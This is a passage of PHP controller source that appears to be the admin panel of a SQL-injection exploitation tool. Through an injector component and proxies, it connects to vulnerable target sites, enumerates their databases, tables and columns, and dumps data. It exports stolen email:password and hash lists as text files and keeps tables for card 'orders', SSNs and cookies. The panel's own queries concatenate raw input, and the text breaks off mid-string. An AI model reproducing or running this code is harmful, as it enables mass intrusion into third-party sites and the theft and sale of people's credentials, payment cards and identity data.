					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $type . ' s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($zona != '') && ($zona != '*')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'  AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'  AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $zona . ' count: ' . $count;
				$str = $z0;
			}


			if ($site != '') {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\'\'  AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\'  AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $zona . ' count: ' . $count;
				$str = $z0;
			}


			header('Content-type: application/txt');
			header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
			echo $z0;
			exit();
		}


		$p['sdate'] = $this->Post->query('SELECT date FROM  `mails` group by date ');
		$p['podate'] = $this->Post->query('SELECT date FROM  `mails` group by date DESC');
		$p['domens'] = $this->Post->query('SELECT * FROM  `renders` order by countMail DESC');
		$this->set('data', $p);
	}

	public function chengetable($bd, $table, $field)
	{
		$tablea = $this->Session->read('table');

		if (($bd . '.' . $table) !== $tablea) {
			$this->Session->write('table', $bd . '.' . $table);
			$this->Session->write('field', $field);
			$this->Session->write('getwhere', '');
			$this->Session->write('tablecount', '1221');
		}
		 else {
			$fileds = $this->Session->read('field');

			if (!(isset($this->data[$field]))) {
				$fileds = str_replace(',' . $field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
			}
			 else {
				$fileds .= ',' . $field;
			}

			$fields = explode(',', $fileds);
			$i = 0;
			$new = '';

			foreach ($fields as $f ) {
				if (trim($f) !== '') {
					if ($i == 0) {
						$new = $f;
					}
					 else {
						$new = $new . ',' . $f;
					}

					++$i;
				}

			}

			$this->Session->write('field', $new);
		}

		$this->gettable();
		$this->layout = false;
		$this->render('gettable');
	}

	public function reconnect($id)
	{
		$this->data = $this->Post->findbyid($id);
		$this->mysqlInj = new $this->Injector();
		$test = $this->mysqlInj->inject($this->data['Post']['header'] . '::' . $this->data['Post']['url']);

		if ($test == true) {
			$this->data['Post']['method'] = $this->mysqlInj->method;
			$this->data['Post']['sposob'] = $this->mysqlInj->sposob;
			$this->data['Post']['column'] = $this->mysqlInj->column;
			$this->data['Post']['date'] = time();
			$this->data['Post']['status'] = 3;
			$this->data['Post']['version'] = $this->mysqlInj->version;
			$data = $this->mysqlInj->mysqlGetValue('mysql', 'user', 'file_priv');

			if ($data['file_priv'] !== false) {
				$this->data['Post']['file_priv'] = 1;
			}


			if (is_array($this->mysqlInj->work) && (0 < count($this->mysqlInj->work))) {
				$work = '';

				foreach ($this->mysqlInj->work as $w ) {
					$work .= $w . ',';
				}

				$this->data['Post']['work'] = $work;
			}


			$this->Session->write('inject', $this->data);
			$this->Post->save($this->data);
			$this->Session->setFlash('Подключились!');
		}
		 else {
			$this->Session->write('inject', $this->data);
			$this->Session->setFlash('Не смогли подключиться');
		}

		$this->redirect(array('action' => 'krutaten/' . $id));
		exit();
	}

	public function goadd()
	{
		if (!(empty($this->data))) {
			$this->Session->write('urls', '');
			uses('Sanitize');
			$data = $this->Post->query('SELECT * FROM `posts` WHERE gurl=\'' . Sanitize::escape($this->data['Post']['url']) . '\'');

			if ($data == array()) {
				$this->Post->save($this->data);
				$this->reconnect($this->Post->id);
				return;
			}


			$this->reconnect($data[0]['posts']['id']);
		}

	}

	public function getTabl($bd, $data)
	{
		if (!(isset($data['tables']))) {
			$data = $this->getTables($bd);
		}


		foreach ($data['tables'][$bd] as $table ) {
			echo '<div style="padding-right:5px">';
			echo $table . '';
		}
	}

	public function getDataBd()
	{
		$data = $this->Session->read('inject');

		foreach ($data['bds'] as $bd ) {
			echo '<div>';
			echo $bd . '';
		}
	}

	public function choisgetdata($param)
	{
		$val = $_POST;

		if (isset($_POST['data'])) {
			$val = $_POST['data'];
		}


		$this->Session->write('get' . $param, $val[$param]);
		exit();
	}

	public function krutaten($id, $load = '')
	{
		$data = $this->Post->findbyid($id);

		if ($load == 'load') {
			$this->Session->write('inject', $data);
			$this->redirect(array('action' => 'krutaten/' . $id));
		}

	}

	public function color($id, $color = '')
	{
		$this->Post->query('UPDATE  `fileds` SET  `color` =  \'' . $color . '\' WHERE  `id` =' . intval($id) . ' LIMIT 1 ;');
		exit();
	}

	public function colorOrders($id, $color = '')
	{
		$this->Post->query('UPDATE  `orders` SET  `color` =  \'' . $color . '\' WHERE  `id` =' . intval($id) . ' LIMIT 1 ;');
		exit();
	}

	public function getbd()
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['Post'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$data2['posts'] = $data['Post'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data2, $set);
		$bds = $this->mysqlInj->mysqlGetAllBd();
		$data['bds'] = $bds;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('data');
	}

	public function getTables($bd)
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['Post'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$data2['posts'] = $data['Post'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data2, $set);
		$data2 = $this->mysqlInj->mysqlGetTablesByDd($bd);
		$data['tables'][$bd] = $data2;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('data');
	}

	public function getField($bd, $table)
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['Post'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$data2['posts'] = $data['Post'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data2, $set);
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);
		$data['field'][$bd][$table] = $data2;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('data');
	}

	public function getcooldata()
	{
		$order = array();
		$get['limit'] = intval($this->Session->read('getlimit'));
		$t = explode('.', $this->Session->read('table'));
		$get['table'] = $t[1];
		$get['bd'] = $t[0];
		$get['where'] = $this->Session->read('getwhere');
		$get['order'] = $this->Session->read('getorder');
		$get['desc'] = $this->Session->read('getdesc');
		$get['field'] = $this->Session->read('field');
		$this->d($get, 'get');
		$data = $this->Session->read('inject');
		$this->d($data, 'data');
		$squle['Post'] = $data['Post'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$this->d($set, 'set');
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$data2['posts'] = $data['Post'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data2, $set);
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'], $get['table'], explode(',', $get['field']), $get['limit'], $order, $get['where']);
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'], $get['table']);
		$this->Session->write('counttable', $count);
		$data = array(
			'data' => array($data['Post']['id'] => $data3)
			);
		$this->layout = false;
		$this->set('field', $this->Session->read('field'));
		$this->set('counttable', $count);
		$this->set('dataCOLL', $data);
		$this->render('viewdata');
	}

	public function gettable()
	{
		$this->layout = false;
		$fileds = $this->Session->read('field');
		$this->set('field', $fileds);
	}
// visit
	public function viewdata()
	{
		$data = array(
			'data' => array(
				2 => array(
					array('id' => '11', 'date' => 'РґР¶РёРіСѓСЂРґР°!1')
					)
				)
			);
		$this->layout = false;
		$this->set('count', $this->Session->read('field'));
		$this->set('field', $this->Session->read('field'));
		$this->set('dataCOLL', $data);
	}

	public function shlakk($g = '0')
	{
		if (intval($g) == 0) {
			$this->Post->query('DELETE FROM `posts` WHERE `status` =0');
		}
		 else if ($g == '1_sql') {
			echo 'DELETE FROM `posts` WHERE `sqlmap_check` =1';
			$this->Post->query('DELETE FROM `posts` WHERE `sqlmap_check` =1');
		}
		 else {
			if ((intval($g) == 1) || (intval($g) == '1')) {
				echo 'DELETE FROM `posts` WHERE `status` =0';
				$this->Post->query('DELETE FROM `posts` WHERE `status` =0');
			}
			 else {
				$this->Post->query('DELETE FROM `posts` WHERE `status`=2 AND `prohod`<5');
			}
		}

		$this->redirect(array('action' => 'mailinfo'));
		exit();
	}

	public function multi_duble_check()
	{
		$this->Post->query('UPDATE  `posts` SET  `prohod` =  0 WHERE  `posts`.`prohod` =5');
		echo 'OK';
	}

	public function multi_duble_check_email()
	{
		$this->Post->query('UPDATE  `posts` SET  `getmail` =  0 WHERE  `posts`.`getmail` =1');
		echo 'OK';
	}

	public function sqlmap_check_all()
	{
		$this->Post->query('UPDATE  `posts` SET  `sqlmap_check` =  1 ');
		echo 'OK';
	}

	public function sqlmap_check_y()
	{
		$this->Post->query('UPDATE  `posts` SET  `sqlmap_check` =  1 WHERE `status`=2 or `status`=3');
		echo 'OK';
	}

	public function sqlmap_check_ne()
	{
		$this->Post->query('UPDATE  `posts` SET  `sqlmap_check` =  1  WHERE `status`=2 AND `prohod`=5');
		echo 'OK';
	}

	public function shlakk_domen($g = '1')
	{
		if (intval($g) == 1) {
			$this->Post->query('DELETE FROM `domens`');
		}


		$this->redirect(array('action' => 'mailinfo'));
		exit();
	}

	public function shlakk_domen_links($g = 1)
	{
		$this->Post->query('DELETE FROM `posts_all` WHERE id =' . $g);
		$this->redirect(array('action' => 'order_domens'));
		exit();
	}

	public function shlak($id)
	{
		$this->Post->query('UPDATE  `posts` SET  `status` =  \'1\' WHERE  `posts`.`id` =' . intval($id) . ' LIMIT 1 ;');
		exit();
	}

	public function shlak2($ggg = NULL)
	{
		if ($ggg == 'corp') {
			$this->Post->query('UPDATE  `mails` SET  `type` = \'0\' WHERE  `type` =\'corp\'');
		}


		if ($ggg == 'big') {
			$this->Post->query('UPDATE  `mails` SET  `type` = \'0\' WHERE  `type` =\'big\'');
		}


		if ($ggg == 'sred') {
			$this->Post->query('UPDATE  `mails` SET  `type` = \'0\' WHERE  `type` =\'sred\'');
		}


		$this->redirect(array('action' => 'mailinfo'));
		exit();
	}

	public function shlak3($id)
	{
		$this->Post->query('DELETE FROM `fileds` WHERE `id` =' . intval($id) . ' LIMIT 1 ;');
		exit();
	}

	public function shlak_card($id)
	{
		$this->Post->query('DELETE FROM `orders` WHERE `id` =' . intval($id) . ' LIMIT 1 ;');
		exit();
	}

	public function shlak_ssn($id)
	{
		$this->Post->query('DELETE FROM `ssn` WHERE `id` =' . intval($id) . ' LIMIT 1 ;');
		exit();
	}

	public function mat()
	{
		$data = $this->Post->query('SELECT * FROM posts WHERE status=2');

		foreach ($data as $value ) {
			$url = 'http://' . $value['posts']['host'] . $value['posts']['path'] . '?' . $value['posts']['query'];
			echo $url . ' - <font color=red>' . $value['posts']['find'] . '</font>|' . $value['posts']['tic'] . '<br><br>';
		}

		exit();
	}

	public function post_recheck()
	{
		$this->Post->query('UPDATE  `posts`  set `status` = 0 AND `prohod` = 0,`find`=\'\' WHERE `status`=1 ');
		$this->d('ok');
	}

	public function domen_recheck()
	{
		$this->Post->query('UPDATE  `domens`  set `status` = 0  WHERE `status`=1 ');
		$this->d('ok');
	}

	public function view_multi($id)
	{
		$data = $this->Post->query('SELECT *  FROM `multis` WHERE `filed_id`=' . $id);
		$this->set('data', $data);
	}

	public function view_iframe($id)
	{
		$url = '/posts/view_multi/' . $id;
		echo '<iframe name="fr1" src="' . $url . '" width="1040" height="500"> </iframe>';
		exit();
	}

	public function view_order($id)
	{
		$data = $this->Post->query('SELECT *  FROM `orders` WHERE `id`=' . $id);
		$this->set('data', $data);
	}

	public function view_iframe_order($id)
	{
		$url = '/posts/view_order/' . $id;
		echo '<iframe name="fr1" src="' . $url . '" width="1040" height="500"> </iframe>';
		exit();
	}

	public function view_order_one($id, $table = 'posts')
	{
		$data = $this->Post->query('SELECT *  FROM `' . $table . '` WHERE `id`=' . $id . ' limit 1');
		$squles = $data;
		$squle = $squles[0];
		$status = $data[0][$table]['status'];
		$prohod = $data[0][$table]['prohod'];
		$url = $data[0][$table]['url'];
		$date = $data[0][$table]['date'];
		$maska = $data[0][$table]['maska'];
		$domen = $data[0][$table]['domen'];
		$gurl = $data[0][$table]['gurl'];
		$sposob = $data[0][$table]['sposob'];
		$method = $data[0][$table]['method'];
		$column = $data[0][$table]['column'];
		$work = $data[0][$table]['work'];
		$file_priv = $data[0][$table]['file_priv'];
		$sleep = $data[0][$table]['sleep'];
		$tic = $data[0][$table]['tic'];
		$version = $data[0][$table]['version'];
		$find = $data[0][$table]['find'];
		$user = $data[0][$table]['user'];
		$http = $data[0][$table]['http'];
		$header = $data[0][$table]['header'];

		if ($gurl != '') {
			$value = $gurl;
		}
		 else {
			$value = $url;
		}

		if (($status == 2) && ($status != 1)) {
			$value_orig = $value;
			$this->mysqlInj = new InjectorComponent();
			if (($http == 'https') || ($http == 'https://')) {
				$this->mysqlIn->https = true;
			}
			 else {
				$this->mysqlIn->https = false;
			}

			$data = parse_url('http://' . str_replace(array('https://', 'http://'), '', $value_orig));
			$this->d($value_orig, '$data$data$data');
			$domen = $data['host'];

			if ($data['query'] == '') {
				$this->d($value_orig . ' - query pusto');
				exit();
			}


			if (!(isset($data['host']))) {
				$this->d($value_orig . ' - host pusto');
				exit();
			}


			$data = $this->oneinfo($header . '::' . $http . $value, $domen);

			if ($data == false) {
				echo 'NE LOMAETSYA';
			}

		}
		 else {
			$squle['Post'] = $squle[$table];

			if (2 < strlen($squle['Post']['sleep'])) {
				$set = $squle['Post']['sleep'];
			}
			 else {
				$set = false;
			}

			$this->mysqlInj = new $this->Injector();
			$ver = $this->mysqlInj->version;
			$this->proxyCheck();
			$this->mysqlInj->inject($squle['Post']['header'] . '::' . $squle['Post']['gurl'], $squle, $set);
			$this->mysqlInj->mysqlGetUser();
			$user = $this->mysqlInj->user;

			if ($this->mysqlInj->https == true) {
				$http = 'https';
			}
			 else {
				$http = 'http';
			}

			if ($id = $this->Post->query('INSERT INTO `posts_one` ' . "\r\n\t\t\t" . '(`url`,`date`,`maska`,`domen`,`gurl`,`prohod`,`status`,`sposob`,`method`,`column`,`work`,`file_priv`,`sleep`,`tic`,`version`,`find`,`http`,`user`,`header`)' . "\r\n\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'' . $gurl . '\',5,3,\'' . $sposob . '\',\'' . $method . '\',\'' . $column . '\',\'' . $work . '\',\'' . $file_priv . '\',\'' . $sleep . '\',\'' . $tic . '\',\'' . $version . '\',\'' . $find . '\',\'' . $http . '\',\'' . $user . '\',\'' . $header . '\')')) {
				$data2 = $this->Post->query('SELECT *  FROM `posts_one` WHERE `domen`=\'' . $domen . '\' limit 1');
				$id2 = $data2[0]['posts_one']['id'];
				echo '<a href=\'/posts/krutaten_one/' . $id2 . '/load\'>REDIRECT</a>';
				$this->redirect(array('action' => 'krutaten_one/' . $id2 . '/load'));
			}
			 else {
				$data2 = $this->Post->query('SELECT *  FROM `posts_one` WHERE `domen`=\'' . $domen . '\' limit 1');
				$id2 = $data2[0]['posts_one']['id'];
				echo '<a href=\'/posts/krutaten_one/' . $id2 . '/load\'>REDIRECT</a>';
				$this->redirect(array('action' => 'krutaten_one/' . $id2 . '/load'));
			}
		}

		$this->set('data', $data);
	}

	public function update_all_oll()
	{
		set_time_limit(0);
		$posts_all = "\r\n" . 'CREATE TABLE IF NOT EXISTS `posts_all` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `prohod` int(10) unsigned NOT NULL,' . "\r\n" . '  `gurl` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `tables` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `status` int(10) unsigned NOT NULL,' . "\r\n" . '  `work` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `sposob` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `method` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `column` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `mysqlbd` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `file_priv` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `version` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `tic` int(3) DEFAULT NULL,' . "\r\n" . '  `category` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'0\',' . "\r\n" . '  `proverka_self` int(10) unsigned NOT NULL,' . "\r\n" . '  `domen` varchar(255) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `path_query` varchar(255) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `path` varchar(255) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `query` varchar(255) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `link_count` int(10) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `check_posts` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `url` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `find` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `getmail` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `maska` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,' . "\r\n" . '  `date` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,' . "\r\n" . '  `sleep` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'0\',' . "\r\n" . '  `tema` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'0\',' . "\r\n" . '  `testing` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,' . "\r\n" . '  `admin` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `pr` int(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `pr_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `alexa` int(50) NOT NULL DEFAULT \'100000000\',' . "\r\n" . '  `alexa_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `country` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'checking\',' . "\r\n" . '  `country_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `order` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `order_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `crawler` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `get_type` varchar(100) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `http` varchar(100) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'http://\',' . "\r\n" . '  `color` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `up` int(2) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `ssn` varchar(255) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `ssn_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `table_admin_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `cookies` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  UNIQUE KEY `path_query` (`path_query`),' . "\r\n" . '  UNIQUE KEY `url` (`url`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;';
		$this->Post->query($posts_all);
		$mails = 'CREATE TABLE IF NOT EXISTS `mails` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `email` varchar(255) NOT NULL,' . "\r\n" . '  `pass` varchar(255) NOT NULL,' . "\r\n" . '  `domen` varchar(255) NOT NULL,' . "\r\n" . '  `zona` varchar(255) NOT NULL,' . "\r\n" . '  `bd` varchar(255) NOT NULL,' . "\r\n" . '  `date` date NOT NULL,' . "\r\n" . '  `hashtype` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `hash` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `hash2` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `meiler` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `type` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `mx` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `abuse` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `down` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `clean` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  KEY `email` (`email`),' . "\r\n" . '  KEY `i_meiler` (`meiler`) USING BTREE,' . "\r\n" . '  KEY `i_date` (`date`) USING BTREE,' . "\r\n" . '  KEY `i_domen` (`domen`) USING BTREE' . "\r\n" . ') ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;';
		$this->Post->query($mails);
		$this->Post->query('ALTER TABLE `mails` ADD UNIQUE `unique_index`(`email`, `pass`);');
		$dump_orders = 'CREATE TABLE IF NOT EXISTS `orders` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '  `shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `table` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `column` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count` int(11) NOT NULL,' . "\r\n" . '  `count_new` int(20) NOT NULL,' . "\r\n" . '  `check_count` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `card2` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `date` varchar(255) NOT NULL,' . "\r\n" . '  `date_new` varchar(255) NOT NULL,' . "\r\n" . '  `color` varchar(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_new2` int(20) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `typedb` varchar(255) NOT NULL,' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT 